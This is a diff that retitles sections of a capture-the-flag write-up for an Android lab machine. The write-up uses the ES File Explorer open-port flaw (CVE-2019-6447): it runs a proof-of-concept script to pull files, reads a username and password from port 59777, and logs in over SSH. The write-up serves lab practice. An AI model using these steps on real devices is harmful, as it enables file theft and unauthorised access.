@@ -2,7 +2,7 @@
 OS: Android
 IP: 10.10.10.247
 
-## Part 1 
+## Part I 
 
 ### Skills learned:
 Curl/Python
@@ -21,8 +21,8 @@ Yields CVE-2019-6447
 + https://github.com/fs0c131y/ESFileExplorerOpenPortVuln
 + https://www.exploit-db.com/exploits/50070
 
-### Step 1
-+python3 poc.py ${cmd} ${IP} 
+### Step 1: file extraction
++ python3 poc.py ${cmd} ${IP} 
 + python3 poc.py ${cmd} ${IP} $dir/$.jpg
 + [+] Done. Saved as 'out.dat'.
 
@@ -30,7 +30,7 @@ Now that you have downloaded the file, open the URL in a browser.
 + ${IP}:59777/$dir/$.jpg
 + File gives UN && PW
 
-### Step 2
+### Step 2: SSH
 + ssh -p 2222 $UN@${IP} 
 + ${PW}
 
@@ -48,7 +48,7 @@ uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybo
 ### Find Flag
 Have fun searching! 
 
-## Part 2
+## Part II
 
 ### Skills learned
 ssh port forwarding
